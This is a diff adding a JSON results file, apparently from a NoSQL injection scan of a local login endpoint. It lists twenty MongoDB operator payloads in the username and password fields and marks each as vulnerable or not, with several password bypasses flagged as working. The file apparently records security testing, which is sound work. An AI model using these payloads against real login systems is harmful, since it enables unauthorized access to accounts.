@@ -1,0 +1,224 @@
+[
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$ne": null
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": "admin",
+      "password": {
+        "$ne": null
+      }
+    },
+    "status": "Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": "admin",
+      "password": {
+        "$gt": ""
+      }
+    },
+    "status": "Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$exists": true
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": "admin",
+      "password": {
+        "$lt": "z"
+      }
+    },
+    "status": "Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$regex": ""
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$ne": "nonexistent"
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$in": ["admin", "user"]
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$nin": []
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": "admin",
+      "password": {
+        "$gte": ""
+      }
+    },
+    "status": "Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$type": "string"
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$not": {
+          "$eq": null
+        }
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$and": [
+          {
+            "$gt": ""
+          },
+          {
+            "$lt": "z"
+          }
+        ]
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$or": [
+          {
+            "$gt": ""
+          },
+          {
+            "$lt": "z"
+          }
+        ]
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$mod": [1, 0]
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$where": "this.password.length > 0"
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$ne": "admin"
+      },
+      "password": {
+        "$ne": "wrong_password"
+      }
+    },
+    "status": "Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$gt": "a"
+      },
+      "password": "password"
+    },
+    "status": "Not Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$regex": "^admin$"
+      },
+      "password": {
+        "$ne": null
+      }
+    },
+    "status": "Vulnerable"
+  },
+  {
+    "url": "http://localhost:5000/login",
+    "payload": {
+      "username": {
+        "$in": ["admin", "root"]
+      },
+      "password": {
+        "$ne": null
+      }
+    },
+    "status": "Vulnerable"
+  }
+]
